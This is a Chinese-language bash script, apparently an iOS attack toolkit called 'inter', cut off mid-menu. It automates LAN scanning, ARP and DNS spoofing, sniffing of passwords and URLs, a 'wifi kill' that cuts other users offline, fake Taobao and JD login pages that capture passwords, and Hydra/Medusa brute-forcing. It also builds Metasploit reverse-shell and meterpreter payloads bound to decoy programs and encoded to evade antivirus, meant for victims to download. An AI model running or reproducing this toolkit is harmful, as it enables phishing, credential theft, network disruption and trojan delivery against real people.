#!/bin/bash
# 这是一个快速抓包的脚本
# 你可以直接修改脚本或优化某个工具包模块
# 因分享而进步 
# 作者: CraK
# 中文源：http://crak.cn/repo/

if [ "$UID" != 0 ];then echo "以root用户运行!";exit 0;fi

update(){ sed -i'' ' s/\x00\x30\x93\xe4/\x00\x30\x93\xe5/g;s/\x00\x30\xd3\xe4/\x00\x30\xd3\xe5/g;' $1 ; wait ;ldid -s $1 
 }
 #断开wifi修复非法进程
repair_new(){
update /bin/grep
update /sbin/ifconfig 
update /usr/bin/awk
update /usr/local/bin/arp-scan
update /usr/bin/hydra
update /bin/ping
update /usr/sbin/dsniff
update /usr/local/bin/medusa
update /usr/sbin/arpspoof
update /usr/sbin/dnsspoof
update /usr/sbin/filesnarf
update /usr/sbin/macof
update /usr/sbin/urlsnarf
update /usr/bin/pirni
update /usr/bin/ipwn
update /usr/local/bin/etterfilter
update /usr/local/bin/ettercap
update /usr/local/bin/etterlog
}
if [ "$1" == "-x" ];then echo "正在修复无法启动和运行出错问题....";cd /var/mobile/pentest/inter/msfmod/;./sl;repair_new > /dev/null 2>&1 ;wait;ifconfig en0 PROMISC 2>/dev/null;echo "完成";exit 0
elif [ "$1" == "-o" ] && [ ! -z "$2" ];then echo "正在过滤pcap包...";cat $2|grep -a -i '^Hos\|Coo\|Refer\|User\|Acc' > inter-pcap.log.log;echo "过滤后的保持当前目录inter-pcap.log";exit
elif [ "$1" == "-q" ];then echo "已关闭所有进程..";sleep .5;killall bash;fi
echo
d1='\033[32m'
d2='\033[0m'
c1='\E[1;34m'
c2='\E[0m'
b1='\E[1;31m'
b2='\E[0m'
echo -e "${b1}     @@ @@@@  @@@@       ${b2}"
echo -e "${b1}   @@   @ @      @@    ${b2}"
echo -e "${b1}  @@     @  @ @    @@  ${b2}"
echo -e "${b1}@@@@@@@@@@@@@@@@@@@@@@@${b2}"
echo -e "${b1}  ##              ##   ${b2}"
echo -e "${b1} ##                ##  ${b2}"
echo -e "${b1}##    ##       ##   ## ${b2}"
echo -e "${b1}##   ############   ## ${b2}"
echo -e "${b1}##   ##  WI-FI ##   ## ${b2}"
echo -e "${b1} ##  ############  ##  ${b2}"
echo -e "${b1}  ##  #        #  ##   ${b2}"
echo -e "${b1}   # #          # #    ${b2}"
echo -e "${b1}  # #            # #   ${b2}"
echo -e "${b1} #   #          #   #  ${b2}"
echo -e "${b1} #     ## ## ##     #  ${b2}"
echo -e "${b1}  ###################  ${b2}"
echo -e "${b1}   #               #	 ${b2}"
echo -e "${b1}    ###############    ${b2}"
echo -e "${b1}      ##       ##         ${b2}"
echo -e "${b1}       #       #   inter-v1.4-5  ${b2}"
echo -e "${b1}                  py:CraK${b2}"
echo "          中文源:crak.cn/repo/   "
echo -e "${c1} +++加载中.....${c2}"

repair_ldid() { echo "修复工具" $ok;echo "运行工具包出现的killed:9 ";echo "& illegal instruction 4问题";echo "输入存在以上问题工具包名称后回车";read -p ":" update_repair;if [ -z "$update_repair" ];then
echo " ";else file_repair=`which $update_repair` ;sed -i'' ' s/\x00\x30\x93\xe4/\x00\x30\x93\xe5/g;s/\x00\x30\xd3\xe4/\x00\x30\xd3\xe5/g;' $file_repair ; wait ;ldid -s $file_repair &>/dev/null;fi	 
}
install() {
if [ ! -f "/usr/bin/dpkg" ];then echo "正在安装工具包...50%"; cd /var/mobile/pentest/inter/debs/arp-scan/arp-scan/ ;./dpkg -i dpkg.deb; wait ;fi
if [ ! -f "/usr/bin/ldid" ];then dpkg -i /var/mobile/pentest/inter/debs/arp-scan/ldid.deb;fi
#rm -rf /var/mobile/pentest/inter/debs
};install  

#dns欺骗相关
etter_fash_dns(){
          ettercap -i en0 -Tq -P dns_spoof -M arp:remote // /$router/ >/dev/null &
		  sleep 5;echo "运行状态:" $? 		 
		  sysctl -w net.inet.ip.forwarding=1 >/dev/null &
		  echo "DNS欺骗已经运行！"
		  echo "监听已启动......";
		  tail -f /var/www/pass.txt
}
showip(){ 
        if [ ! -d "/var/mobile/pentest/inter" ];then echo "没有配置目录！！";exit;fi
	    if [ ! -f "/usr/bin/ldid" ];then echo "核心工具包未安装，无法运行..";exit;fi
		ok=`echo -e "${d1}[OK]${d2}"`
		export localhost_ip=`ifconfig en0|grep broadcast|cut -d " " -f2`
		router=`netstat -rn|grep default|grep en0|awk '{printf $2}'`
		darwin_name=`uname -r`
		darwin_os=`uname -a|cut -d' ' -f15`
		neic=`df -h|awk 'NR==4 {print $2}'|cut -d'G' -f1`
		if [ $neic -lt 15 ]; then i1=16G
		elif [ $neic -lt 27 ];then i2=32G
		elif [ $neic -lt 60 ];then i3=64G
		else i4=128G	;fi
		unll="/var/mobile/pentest/inter/hostlist"
		hack_user="/var/mobile/pentest/inter/medusa/user.txt";sleep 2
		show_local_ip=`arp-scan -lNI en0 -t 5|sed -n '/:..:/'p | nl > $unll` > /dev/null 2>&1
		wait
		if [ ! -s "$unll" ];then echo "请确保连接到wifi";sleep 3;echo "遇到一个错误..";echo "正在尝试自动修复...";repair_new > /dev/null 2>&1;echo "完成\n你可以手动修复它";repair_ldid; exit 0;fi
		darwin_licalhost=`cat $unll|wc -l` ;wait ; }
darwin() {
echo -e "${b1} +++本机设备:${b2}" "${d1}$darwin_os $i1 $i2 $i3 $i4 ${d2}"
echo -e "${b1} +++内核版本:${b2}" "${d1}$darwin_name${d2}"
echo -e "${b1} +++路由器IP:${b2}" "${d1}$router${d2}"
echo -e "${b1} +++本机 IP:${b2}" "${d1}$localhost_ip${d2}"
echo -e "${b1} +++已扫描局域网连接数为${b2}" "${d1}$darwin_licalhost${d2}" "${b1}台设备${b2}"
cat $unll ;}
ipport() {
	ncport="/var/mobile/pentest/inter/ncport.txt"
	cat $unll | awk '{print $2}' >$ncport
	for i in `cat $ncport`;do
	  { 
		nc -v -z -n -w 2 $i http ssh ftp telnet 135 139 445 5900 2222
	  }&
	done;wait;rm $ncport
	};tubiao=`echo -e "${c1}#=======|:${c2}"`
scanip() {
	    echo "输入IP序列号1~${darwin_licalhost}"
	    read -p $tubiao  ip ; if [ -z "$(echo $ip|sed -n "/^[0-9]\+$/p")" ];then echo "请输入数字！";continue;else scan=`cat $unll|awk -v a=$ip 'NR==a{print $2}'`
        echo -e "${b1}已选择IP:${b2}" $scan ; echo -e "${b1}是否开始运行？(y|n)${b2}"; read key; fi
}; pwninter() {
showip

ifconfig pdp_ip0 down 2>/dev/null
darwin
while : ;do
	echo -e "${b1}===============选择列表====================${b2}"
	echo -e "${b1} [1].intercepter   [6].mitm attcak${b2}"
	echo -e "${b1} [2].Ettercap-ng   [7].Medusa${b2}"
	echo -e "${b1} [3].ngrep-script  [8].scan port ${b2}"
	echo -e "${b1} [4].CUPP passwd   [9].Repair tool  ${b2}"
	echo -e "${b1} [5].print derv    [0].Exit ${b2}"
	echo -e "${b1}		 ${b2}"
	echo -e "${b1} [10].Hydra        [11].Metasploit  ${b2}"
	echo -e "${b1} [12].help							${b2}"
	echo -e "${b1}=========================================${b2}"
	echo -e "${c1}选择功能模块${c2}"
	read -p $tubiao  ka
	case "$ka" in
	  1) which ettercap >/dev/null 2>&1
	     if [ $? -ne 0 ];then echo "ettercap未安装！！！";continue;fi
	     echo "intercepter-ng" $ok 
		 echo "输入IP序列号1~${darwin_licalhost}"
	     read -p "目标IP1:  " ip;if [ -z "$(echo $ip|sed -n "/^[0-9]\+$/p")" ]; then echo "IP1不能为空!";continue;else scan=`cat $unll|awk -v a=$ip 'NR==a{print $2}'`
	     read -p "目标IP2:  " ip1;	scan1=`cat $unll|awk -v b=$ip1 'NR==b{print $2}'`
		 read -p "目标IP3:  " ip2;	scan2=`cat $unll|awk -v b=$ip2 'NR==b{print $2}'`
         echo -e "${b1}已选择IP(1~3):${b2}" $scan $scan1 $scan2
	     echo -e "${b1}是否开始运行？(y|n)${b2}"; read key;if [ -z "$key" ]; then echo "输入为空"
	     elif [ "$key" == "y" ]; then cd /var/mobile/pentest/inter/intercepter;./intercepter 1 2 w -gw $router -t1 $scan -t2 $scan1 -t3 $scan2
		 else echo ""; fi;fi
         ;;
      2)  
		  echo "Ettercap-ng" $ok ;etterdns="/usr/local/share/ettercap/etter.dns";
		  echo -e "${b1} [1].抓取所有数据包 ${b2}"
         echo -e "${b1} [2].DNS欺骗所有主机 ${b2}"
		  echo -e "${b1} [3].DNS欺骗单个主机 ${b2}"
		  echo -e "${b1} [4].使用本机HTTP欺骗 ${b2}"
		  echo -e "${b1} [5].使用预定义HTML文件 ${b2}"
		  read -p $tubiao  dnsspoof
		  case "$dnsspoof" in
		      1) path_etter_pcap="/var/mobile/pentest/inter/ettercap.pcap"
			     echo "这将通过ettercap抓取所有主机数据包(y|n)?";read -p $tubiao etter_pcap;if [ "$etter_pcap" == "y" ];then
				 ettercap -i en0 -Tq -M arp:remote // /$router/ -w $path_etter_pcap >/dev/null &
				 sleep 6; sysctl -w net.inet.ip.forwarding=1 ;echo "ettercap抓包已经后台运行中，输入'0'可结束";fi ;;
			  2) which ping >/dev/null 2>&1
			     if [ $? == 0 ];then echo "ping命令未安装！！！";continue;fi
			     echo "输入重定向网址" ; read url ; echo -e "${b1}是否开始运行？(y|n)${b2}" ; read key;  if [ "$key" == "y" ]&&[ -n "$key" ]&&[ -n "$url" ]; then  ping $url -s 1 -c 1 |cut -d'(' -f2 | cut -d')' -f1 |head -n 1|awk '{print "*.*.*\tA\t"$1}' > $etterdns
				 sleep 2 ;if [ ! -s "$etterdns" ];then echo "无效网址！请先浏览器访问测试下!";echo $url;killall ping 2>/dev/null; else 
				 ettercap -i en0 -Tq -P dns_spoof -M arp:remote // /$router/ >/dev/null & 
				 sleep 3 ;sysctl -w net.inet.ip.forwarding=1 ; fi ;fi ;;
			  3) 
                 echo "输入IP序列号1~${darwin_licalhost}"
	             expr $ip "+" 1 &>/dev/null
	             read -p $tubiao  ip
	             if [ -z "$ip" ]&&[ -z "$dnsspoof" ]; then
				   echo "输入为空！！！"
				   continue
	             else
                   scan=`cat $unll|awk -v a=$ip 'NR==a{print $2}'`
                   echo -e "${b1}已选择IP:${b2}" $scan
				   echo "输入重定向网址";read url
				   echo -e "${b1}是否开始运行？(y|n)${b2}"; read key ;echo '检测网址...'
		           if [ "$key" == "y" ]&&[ -n "$key" ]&&[ -n "$url" ]; then
				     ping $url -s 1 -c 1 |cut -d'(' -f2 | cut -d')' -f1 |head -n 1|awk '{print "*\tA\t"$1}' > $etterdns 2>/dev/null &
					 ping $url -s 2 -c 1 |cut -d'(' -f2 | cut -d')' -f1 |head -n 1|awk '{print "*.*.*\tPTR\t"$1}' >> $etterdns 2>/dev/null &
					 sleep 2
					 if [ ! -s "$etterdns" ];then
					   echo "无效网址！请先浏览器访问测试下！";echo $url
					   killall ping 2>/dev/null
				     else
			          ettercap -i en0 -Tq -P dns_spoof -M arp:remote /$scan/ /$router/ -w /var/mobile/pentest/inter/ettercap/log.pcap >/dev/null &
					  sleep 3;echo $?					 
					  sysctl -w net.inet.ip.forwarding=1 >/dev/null &		 
					  echo "DNS欺骗已经运行！如果你需要关闭ettercap";echo "请输入0关闭ettercap";read inputer;if [ "$inputer" == "0" ];then killall ettercap 2>/dev/null;fi
					  read back ;fi;else echo "输入错误！"
				   fi; fi ;;
4) 
echo -e "\e[1;33m这将网络重定向到本机80端口,这需要你安装依赖后\n在/var/www/目录下存放index.html网站文件你\n可以添加你想要的任意效果 :p这\n将欺骗整个局域网"; echo "---"
which lighttpd >/dev/null 2>&1
if [ $? -eq 0 ];then 
   trap 'continue' INT
   echo -e "输入你需要当目标机访问域名执行重定向的网站\n格式如*.qq.com";
   read -p $tubiao url1
   lighttpd -f /etc/lighttpd.conf >/dev/null 2>&1
   if [ ! -n "$url1" ];then continue
   else trap 'continue' INT
     echo "这是预定义html文件，针对你输入网站重定向"
     echo -e "\e[1;33m"
	 echo "[1] 恶搞弹窗" 
     echo "[2] 淘宝钓鱼(手机版)" 
	 echo "[4] 京东钓鱼(电脑版)"
     echo "[0] 使用自定义"	 
     echo "你的选择";
	 read -p $tubiao fash_dns
	 if [ "$fash_dns" == "1" ];then
	     rm /var/www/*
	     cp /var/mobile/pentest/inter/msfmod/www/1/* /var/www
		 chmod 777 /var/www/pass.txt
		 echo $localhost_ip | awk -v c=$url1 '{print c "\tA\t" $1}' > /usr/local/share/ettercap/etter.dns
		 ettercap -i en0 -Tq -P dns_spoof -M arp:remote // /$router/ >/dev/null &
		 sleep 5	;echo "运行状态:" $?		 
		 sysctl -w net.inet.ip.forwarding=1 >/dev/null &
		 echo "DNS欺骗已经运行！如果你需要关闭ettercap";echo "请输入0关闭ettercap"
		 read -p ':' inputer
		 if [ "$inputer" == "0" ];then killall ettercap 2>/dev/null;fi
		 fi
	 if [ "$fash_dns" == "2" ];then
		  rm /var/www/*
		  cp /var/mobile/pentest/inter/msfmod/www/2/* /var/www
		  chmod 777 /var/www/pass.txt
		  echo $localhost_ip | awk -v c=$url1 '{print c "\tA\t" $1}' > /usr/local/share/ettercap/etter.dns
		  sleep .5
		  echo "[*]"
		  etter_fash_dns
		  fi
	 if [ "$fash_dns" == "4" ];then
	    rm /var/www/*
		cp /var/mobile/pentest/inter/msfmod/www/3/* /var/www
		chmod 777 /var/www/pass.txt
		echo $localhost_ip | awk -v c=$url1 '{print c "\tA\t" $1}' > /usr/local/share/ettercap/etter.dns
		sleep .5
		echo "[*]"
		etter_fash_dns
		fi
	 if [ "$fash_dns" == "0" ];then
	     echo "使用默认/var/www/index.html"
	     echo $localhost_ip | awk -v c=$url1 '{print c "\tA\t" $1}' > /usr/local/share/ettercap/etter.dns
		 ettercap -i en0 -Tq -P dns_spoof -M arp:remote // /$router/ >/dev/null &
		 sleep 5	;echo "运行状态:" $?		 
		 sysctl -w net.inet.ip.forwarding=1 >/dev/null &
		 echo "DNS欺骗已经运行！如果你需要关闭ettercap";echo "请输入0关闭ettercap"
		 read -p ':' inputer
		 if [ "$inputer" == "0" ];then killall ettercap 2>/dev/null;fi
		 fi
   fi
else 
   echo "...."
   echo "未检测到本机安装lighttpd服务"
   echo "请到cydia中安装lighttpd"
   echo "...."
 fi ;;
5)
which lighttpd >/dev/null 2>&1
if [ $? -eq 0 ];then echo "[*]";sleep .5
  trap 'continue' INT
  echo "这是一些预定义的html文件，针对整个局域网使用" 
  echo -e "\e[1;33m"
  echo "[1] 恶搞弹窗" 
  echo "[2] 淘宝钓鱼(手机版)" 
  echo "[4] 京东钓鱼(电脑版)"
  echo "你的选择";
  read -p $tubiao fash_dns
  if [ "$fash_dns" == "1" ];then
     rm /var/www/*
	 cp /var/mobile/pentest/inter/msfmod/www/1/* /var/www
	 ettercap -i en0 -Tq -P dns_spoof -M arp:remote // /$router/ >/dev/null &
     sleep 5;echo "运行状态:" $?		 
     sysctl -w net.inet.ip.forwarding=1 >/dev/null &
     echo "DNS欺骗已经运行！如果你需要关闭ettercap";echo "请输入0关闭ettercap";read -p ':' inputer;if [ "$inputer" == "0" ];then killall ettercap 2>/dev/null;fi
     fi
  if [ "$fash_dns" == "2" ];then
	  rm /var/www/*
	  cp /var/mobile/pentest/inter/msfmod/www/2/* /var/www
	  chmod 777 /var/www/pass.txt
	  echo -e "\e[1;33m 这将欺DNS骗整个局域网并转向伪造的淘宝登陆界面\n一旦用户登陆，密码将显示出来，建议针对单个主机"
	  sleep .5
	  echo "[*]"
	  etter_fash_dns
	  fi
   if [ "$fash_dns" == "4" ];then
	    rm /var/www/*
		cp /var/mobile/pentest/inter/msfmod/www/3/* /var/www
		chmod 777 /var/www/pass.txt
		echo -e "\e[1;033m 这将欺DNS骗整个局域网并转向伪造的东京登陆界面\n一旦用户登陆，密码将显示出来，建议针对单个主机"
		sleep .5
		echo "[*]"
		etter_fash_dns
		fi
else 
  echo "lighttpd未安装！！"
fi
esac ;;
     3) which lighttpd >/dev/null 2>&1
	    if [ $? -ne 0 ];then echo "ngrep未安装！！";continue;fi
	    echo "ngrep-script " $ok;scanip;if [ -z "$key" ]; then echo "输入为空！！！";elif [ "$key" == "y" ]; then
		sysctl -w net.inet.ip.forwarding=1
		echo "数据将保存到inter目录为ngrep.pcap"
        arpspoof -i en0 -t $scan $router > /dev/null 2>&1 &
        arpspoof -i en0 -t $router $scan > /dev/null 2>&1 &
		path_ngrep="-O /var/mobile/pentest/inter/ngrep.pcap"
	    ngrep $path_ngrep 'USER|PASS|user|pass|username|password' src host $scan|egrep -A1 ">|USER|PASS|user|pass|username|password"
	    fi; ;;
4) echo "cupp passwd" $ok
cupp_set(){
cd /var/mobile/pentest/inter/cupp
python cupp.py $proto $path
} ;while : ;do 
echo "--------------"
echo "[1] 下载字典 "
echo "[2] 创建字典"
echo "[0] 退出"
echo "--------------"
echo "请输入选择(0-3)" ;read option;case $option in
1) proto="-l" ;cupp_set ;;
#2) proto="-w" ;echo "输入需要修改的词典路径位置";read path;if [ "$path" ];then export path="$path" ;fi;cupp_set ;;
2) proto="-i" ;cupp_set ;;
0) break ;;
*) echo "请选择选择 [1-3]";
echo "按回车键继续. . ." ;read ;clear;;esac; done ;;
     5) 
	 which pirni >/dev/null 2>&1
	 if [ $? -ne 0 ];then echo "pirni未安装！！！";continue;fi
	 echo "pirni-derv" $ok
		  echo "这将抓取局域网所有主机数据包！(y|n)?"
		  read -p $tubiao pipcap
		  if [ "$pipcap" == "y" ]; then cd /var/mobile/pentest/inter/derv;./b4.sh > /dev/null 2>&1 &
		   ./derv.sh -u -p -c 
		  fi; wait;if [ -f "password1.txt" ] && [ -f "password2.txt" ]; then
		  rm password1.txt; rm password2.txt;fi
		  rm inter.pcap &>/dev/null ; ;;
	 6) 
	 which dsniff >/dev/null 2>&1
	 if [ $? -ne 0 ];then echo "dsniff未安装！！！";continue;fi
	 echo "mitm attcak" $ok
		  echo -e "${b1} [1].wifi kill ${b2}"
          echo -e "${b1} [2].dnsspoof ${b2}"
		  echo -e "${b1} [3].urlsnarf ${b2}"
		  #echo -e "${b1} [4].使用本机HTTP欺骗 ${b2}"
		  read -p $tubiao mitm 
		  case "$mitm" in
		  1) 
		   echo "wifi-kill" $ok ;echo "断开局域网其他用户网络连接";echo "输入IP序列号1~${darwin_licalhost}";
		   read -p "目标IP1:  " ip;if [ -z "$(echo $ip|sed -n "/^[0-9]\+$/p")" ]; then echo "IP1不能为空!";continue;else scan=`cat $unll|awk -v a=$ip 'NR==a{print $2}'`
	       read -p "目标IP2:  " ip1; scan1=`cat $unll|awk -v b=$ip1 'NR==b{print $2}'`
		   read -p "目标IP3:  " ip2; scan2=`cat $unll|awk -v b=$ip2 'NR==b{print $2}'`
		   echo -e "${b1}已选择IP(1~3):${b2}" $scan $scan1 $scan2
	       echo -e "${b1}是否开始运行？(y|n)${b2}"; read key;if [ -z "$key" ]; then echo "输入为空"
		   elif [ "$key" == "y" ]; then
		      arpspoof -i en0 -t $scan $router > /dev/null 2>&1 &
			  arpspoof -i en0 -t $scan1 $router > /dev/null 2>&1 &
			  arpspoof -i en0 -t $scan2 $router > /dev/null 2>&1 &
			  sysctl -w net.inet.ip.forwarding=0 > /dev/null 2>&1 &
		  sleep .5;echo "运行状态:" $?;echo "wifikill已经后台运行...";echo "输入'y'停止进程";read -p $tubiao netkill;if [ "$netkill" == "y" ]; then killall arpspoof
		  sysctl -w net.inet.ip.forwarding=1 > /dev/null 2>&1 &
		  echo "关闭wifi kill"; fi;fi;fi 
	     ;;
		  2)  echo "dnsspoof" $ok ;echo "DNS欺骗局域网所有主机";urlip="/var/mobile/pentest/inter/dnsspoof/host.txt"; echo "输入重定向网址";read -p ':' url
       if [ -z "$url" ]; then echo "输入错误！";continue;else echo -e "${b1}是否开始运行？(y|n)${b2}";fi;read dns_key ;if [ "$dns_key" == "y" ]; then ping $url -s 1 -c 1 |cut -d'(' -f2 | cut -d')' -f1 |head -n 1|awk '{print $1" ""*"}' > $urlip
       sleep 2 ;sysctl -w net.inet.ip.forwarding=1 >/dev/null 2>&1 &
       arpspoof $router > /dev/null 2>&1 &
       #arpspoof $scan > /dev/null 2>&1 &
       dnsspoof -f $urlip host $router and udp port 53 >/dev/null 2>&1 &
       echo "dnsspoof已经启动，退出按0";read -p ':' dns;if [ "$dns" == "0" ];then killall arpspoof;killall dnsspoof;fi;rm $urlip;fi ;;
		3) echo "urlsnarf" $ok ;scanip 
		  if [ "$key" == "y" ]&&[ -n "$key" ]; then trap "echo ''" INT;sysctl -w net.inet.ip.forwarding=1 > /dev/null 2>&1 &
		    arpspoof -i en0 -t $scan $router > /dev/null 2>&1 &
			arpspoof -i en0 -t $router $scan > /dev/null 2>&1 &
			urlsnarf -i en0 | while read line ; do
			 echo $line |awk -F "\"" '{print $4}'
			 echo $line |cut -d"(" -f2|cut -d")" -f1
			 echo $line >> "/var/mobile/pentest/inter/urlsnarf.log" ; done;echo "已保存urllog.log";fi
		esac; ;;
	 7) which medusa >/dev/null 2>&1
	    if [ $? -ne 0 ];then echo "medusa未安装！！！";continue;fi 
	 echo "Medusa" $ok
	 echo "输入IP序列号1~${darwin_licalhost}"; read -p $tubiao  ip
	 if [ -z "$(echo $ip| sed -n "/^[0-9]\+$/p")" ]; then echo "输入为错误！！！";continue;fi
          scan=`cat $unll|awk -v a=$ip 'NR==a{print $2}'`; echo -e "${b1}已选择IP:${b2}" $scan
		  echo "正在扫描'SSH,FTP,Telnet,HTTP,VNC'服务..."; echo "----"
		  for i in `echo $scan`; do
			     {
			       nc -v -n -z -w 1 $scan http ssh ftp telnet 135 139 445 5900 2222
				 }& 
		  done; wait;echo "----" ;echo "输入需要破解的服务名称";read -p $tubiao port1; 
		  #if [ -z "$(echo $port1| sed -n "/^[a-z]\+$/p")" ];then echo "只能输入服务名称！"
		  echo "输入密码词典到路径，如果没有直接回车使用默认:"; read -p ":" passwd_list
		  if [ "$passwd_list" ];then passwd_list="$passwd_list";echo "已设置路径为:" $passwd_list
          elif [ "$passwd_list" == "" ];then passwd_list="/var/mobile/pentest/inter/medusa/pass.txt"
		     echo "这将需要几分钟时间，取决于密码文件的大小"; medusapass="/var/mobile/pentest/inter/medusa/password.txt"
		     medusa -U "$hack_user" -P "$passwd_list" -h $scan -f -M $port1|while read line; do
		       if [[ `echo $line | grep -n 'SUCCESS'` == "" ]] ;then echo $line|cut -d"(" -f4|cut -d")" -f1
			   else echo $line > $medusapass
               cat $medusapass ;echo "密码已保存到'inter/medusa/password.txt'中" ;sleep 2;
			   fi
			   done
		   fi
	     ;;
	 8) echo "---IP刷新---" $ok
	     showip
		 cat $unll
		 echo "---端口扫描---" $ok
		 ipport; ;;
	 9) repair_ldid  ;;
	 
	 10) 
	 which hydra >/dev/null 2>&1
	 if [ $? -ne 0 ];then echo "hydra未安装！！！";continue;fi
	 echo "Hydra" $ok;echo "输入需要破解的地址";read -p ':' hydra_address;if [ -z "$hydra_address" ];then echo "输入为空！！";continue;fi
	 echo "输入密码词典到路径，如果没有直接回车使用默认:"; read -p ":" passwd_list
	 if [ "$passwd_list" ];then passwd_list="$passwd_list";echo "已设置路径为:" $passwd_list
	 elif [ "$passwd_list" == "" ];then passwd_list="/var/mobile/pentest/inter/medusa/pass.txt";fi
	 hydra_hack
	 ;;
	 11) echo "" ;msfautopwn ;;
	 
	 12) echo "帮助文档";cat /var/mobile/pentest/inter/inter-help.log;echo "";read -p ':';clear ;;
	 0)  rm $unll 
			killall tail 2>/dev/null
	       killall ettercap 2>/dev/null
		   killall arpspoof 2>/dev/null
		   killall intercepter 2>/dev/null
		   killall ettercap 2>/dev/null
           killall pirni 2>/dev/null
		   killall bash 2>/dev/null
		   sysctl -w net.inet.ip.forwarding=1
		   wait; exit 0 ;;
    [a-z]|[A-Z]|*) echo "请输入以上序列号!";read ;;
	esac
	echo ""
  done
}
function hydra_hack(){
while :;do
echo "----------"
echo "[1] TELNET [2] FTP  [3] SSH"
echo "[4] RSH    [5] SMTP [6] POP3"
echo "[7] SMB    [8] IMAP [9] HTTP-PROXY"
echo "[10] HTTP-GET    [11] HTTP-POST-FORM"
echo "[12] HTTP-HEAD   [13] HTTPS-GET"
echo "[0] 返回"
echo "----------"
echo "输入需要爆破的服务序列号"
read -p ':' hydra_port
case $hydra_port in
1) export PROTO="telnet"
echo "[+] 已选择: TELNET"
break ;;
2) export PROTO="ftp"
echo "[+] 已选择: FTP"
break ;;
3) export PROTO="ssh2"
echo "[+] 已选择: SSH"
break ;;
4) export PROTO="rsh"
echo "[+] 已选择: RSH"
break ;;
5) export PROTO="smtp-auth"
echo "[+] 已选择: SMTP"
break ;;
6) export PROTO="pop3"
echo "[+] 已选择: POP3"
break ;;
7) export PROTO="smb"
echo "[+] 已选择: SMB"
break ;;
8) export PROTO="imap"
echo "[+] 已选择: IMAP"
break ;;
9) export PROTO="http-proxy"
echo "[+] 已选择: HTTP-PROXY"
break ;;
10) export PROTO="http-get"
echo "[+] 已选择: HTTP-GET"
break ;;
11) export PROTO="http-post-form"
echo "[+] 已选择: HTTP-POST-FORM"
echo "[>] 请输入网站的后页例如'index.php?'" 
read -p ':' var1
if [ "$var1" ]; then 
export var1="$var1"
fi
echo "[>] 请输入参数 例如'{USERNAME_NAME}=^USER^&{PASSWORD_NAME}=^PASS^'" 
read -p ':' var2
if [ "$var2" ]; then
export var2=":$var2"
fi
echo "[>] 请输入 /login=failed" 
read -p ':' var3
if [ "$var3" ]; then
export var3=":$var3"
fi
break ;;
12) export PROTO="http-head"
echo "[+] 已选择: HTTP-HEAD"
break ;;
13) export PROTO="https-get"
echo "[+] 已选择: HTTPS-GET"
break ;;
0) break;;
*) echo "只能选择 [1-13]";
echo "回车继续..." ; read ;clear ;;
esac
done
sleep .5;echo "正在启动hydra爆破..."
hydra -L "$hack_user" -P "$passwd_list" -e ns -t 15 -f -s -vV "$hydra_address" "$PROTO" /$var1$var2$var3
sleep .5
echo "[>] 完成!" 
}
msfautopwn() {
msfpath="/var/mobile/pentest/msf"
if [ ! -d "$msfpath" ];then echo "没有在/var/mobile/pentest/msf检测到你安装msf";echo "请在crak源中安装msf";sleep 2;continue;fi
if [ ! -f "/usr/sbin/lighttpd" ]; then echo -e "\e[1;33m检测...\n未安装Lighttpd，请到cydia搜索安装lighttpd和\nlighttpd Settings，安装完毕后到设置里面重新\n关闭在开启lighttpd服务，成功开启后将生成\n/var/www/目录用于存放文件，msf生成到后门将放\n置此目录，通过dns定向本机80端口，\n诱导受害人下载木马后门";echo '*';sleep 2;continue;fi
sleep .2;echo -e "\e[1;31m********** Metasploit **********";echo "本机80端口状态";nc -v -z -n -w 2 127.0.0.1 http
function encnum(){
echo "【*】输入编码的次数 "
read -p $tubiao num
if [ "$num" ];then export num="$num";fi 
}
function payload(){
echo "【*】输入侦听端口 " 
read -p $tubiao port
if [ "$port" ];then export port="$port";fi
sleep .2
while :;do
echo -e "\e[1;34m"
echo "[1]    KeyLogger.exe "
echo "[2]    VNC Viewer.exe "
echo "[3]    蜘蛛纸牌 "
echo "[4]    Wget.exe "
echo "[5]    Radmin.exe "
echo "[6]    SBD.exe "
echo -e "\e[1;37m "
echo "【*】选择以上捆绑程序"
read -p $tubiao yourch
case $yourch in
1)  
export bin="-x /var/mobile/pentest/inter/msfmod/exe/klogger.exe"
break ;;
2)  
export bin="-x /var/mobile/pentest/inter/msfmod/exe/vncviewer.exe"
break ;;
3)  
export bin="-x /var/mobile/pentest/inter/msfmod/exe/spider.exe"
break ;;
4)  
export bin="-x /var/mobile/pentest/inter/msfmod/exe/wget.exe"
break ;;
5)  
export bin="-x /var/mobile/pentest/inter/msfmod/exe/radmin.exe"
break ;;
6)  
export bin="-x /var/mobile/pentest/inter/msfmod/exe/sbd.exe"
break ;;
*) echo -e "\e[1;31m只能选择数字[1-6]！！";
echo "回车继续. . ." ; read ;;
esac
done
while :;do
echo -e "\e[1;34m"
echo "[1] windows/shell/reverse_tcp (Stg)"
echo "[2] windows/shell_reverse_tcp "
echo "[3] windows/meterpreter/reverse_tcp (Stg) "
echo "[4] windows/vncinject/reverse_tcp (Stg) "
echo "[5] windows/x64/shell/reverse_tcp (Stg) "
echo "[6] windows/x64/shell_reverse_tcp" 
echo "[7] windows/x64/meterpreter/reverse_tcp (Stg) "
echo "[8] windows/x64/vncinject/reverse_tcp (Stg) "
echo -n -e "\e[1;37m"
echo "【*】 选择以上有效载荷 "
read -p $tubiao yourch
case $yourch in
1) export payload="windows/shell/reverse_tcp"
break ;;
2) export payload="windows/shell_reverse_tcp"
break ;;
3) export payload="windows/meterpreter/reverse_tcp"
break ;;
4) export payload="windows/vncinject/reverse_tcp"
break ;;
5) export payload="windows/x64/shell/reverse_tcp"
break;;
6) export payload="windows/x64/shell_reverse_tcp"
break ;;
7) export payload="windows/x64/meterpreter/reverse_tcp"
break ;;
8) export payload="windows/x64/vncinject/reverse_tcp"
break ;;
*) echo -e "\e[1;31m只能输入以上数字 [1-8]";
echo "回车继续..." ; read ;;
esac
done
while :;do
echo -e "\e[1;34m"
echo "[1]  x86/avoid_utf8_tolower (Normal) "
echo "[2]  x86/call4_dword_xor (Normal) "
echo "[3]  x86/countdown (Normal) "
echo "[4]  x86/fnstenv_mov (Normal) "
echo "[5]  x86/jmp_call_additive (Great)  "
echo "[6]  x86/shikata_ga_nai (Excellent)  "
echo "[7]  x86/unicode_mixed (Normal)  "
echo "[8]  x86/unicode_upper (Normal)  "
echo " --------------------------------- "
echo "[9]  Yellow Multi encoder (Light)  "
echo "[10] Red Multi encoder (Med)  "
echo "[11] Blue Multi encoder (Med)  "
echo "[12] Purple Multi encoder (High)  "
echo "[13] Black encoder (High)  "
echo " --------以上为混合编码------------ "
echo -e "\e[1;37m"
echo "【*】选择编码,用于过杀毒软件查杀"
read -p $tubiao yourch
cd $msfpath
case $yourch in
1) export enc=x86/avoid_utf8_tolower
encnum
